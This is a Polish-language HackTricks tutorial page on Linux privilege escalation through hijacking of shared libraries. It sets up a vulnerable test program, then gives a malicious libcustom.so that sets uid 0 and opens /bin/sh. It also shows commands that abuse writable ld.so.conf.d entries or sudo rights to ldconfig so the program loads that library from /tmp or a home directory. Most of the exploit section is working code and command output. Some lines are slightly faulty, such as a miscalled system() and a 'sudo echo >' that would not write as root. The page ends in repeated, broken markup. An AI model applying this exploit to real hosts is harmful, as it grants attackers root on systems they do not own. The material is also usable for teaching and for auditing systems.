# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## Przygotuj środowisko

W poniższej sekcji znajdziesz kod plików, które zamierzamy użyć do przygotowania środowiska

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Utwórz** te pliki na swoim komputerze w tym samym folderze
2. **Skompiluj** **bibliotekę**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib`: `sudo cp libcustom.so /usr/lib` (uprawnienia roota)
4. **Skompiluj** **wykonywalny**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowane** z _/usr/lib_ i czy możesz **wykonać** binarny.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

W tym scenariuszu założymy, że **ktoś stworzył podatny wpis** w pliku _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Wrażliwy folder to _/home/ubuntu/lib_ (gdzie mamy dostęp do zapisu).\
**Pobierz i skompiluj** następujący kod w tym katalogu:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w źle skonfigurowanej** ścieżce, musimy poczekać na **ponowne uruchomienie** lub na to, aby użytkownik root wykonał **`ldconfig`** (_jeśli możesz wykonać ten plik binarny jako **sudo** lub ma on **bit suid**, będziesz mógł go wykonać samodzielnie_).

Gdy to nastąpi, **sprawdź ponownie**, skąd wykonywalny plik `sharevuln` ładuje bibliotekę `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Jak widać, **ładowanie odbywa się z `/home/ubuntu/lib`** i jeśli jakikolwiek użytkownik to uruchomi, zostanie uruchomiona powłoka:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Zauważ, że w tym przykładzie nie podnieśliśmy uprawnień, ale modyfikując wykonywane polecenia i **czekając na to, aby root lub inny użytkownik z uprawnieniami wykonał podatny plik binarny**, będziemy w stanie podnieść uprawnienia.
{% endhint %}

### Inne błędne konfiguracje - Ta sama luka

W poprzednim przykładzie sfałszowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień w pliku konfiguracyjnym w `/etc/ld.so.conf.d/`**.\
Jednak istnieją inne błędne konfiguracje, które mogą powodować tę samą lukę; jeśli masz **uprawnienia do zapisu** w jakimś **pliku konfiguracyjnym** w `/etc/ld.so.conf.d`, w folderze `/etc/ld.so.conf.d` lub w pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą lukę i ją wykorzystać.

## Exploit 2

**Załóżmy, że masz uprawnienia sudo do `ldconfig`**.\
Możesz wskazać `ldconfig`, **skąd ładować pliki konfiguracyjne**, więc możemy to wykorzystać, aby `ldconfig` ładował dowolne foldery.\
Więc stwórzmy pliki i foldery potrzebne do załadowania "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **poprzednim exploicie**, **stwórz złośliwą bibliotekę w `/tmp`**.\
A na koniec załadujmy ścieżkę i sprawdźmy, skąd binarny plik ładuje bibliotekę:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, mając uprawnienia sudo do `ldconfig`, możesz wykorzystać tę samą podatność.**

{% hint style="info" %}
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
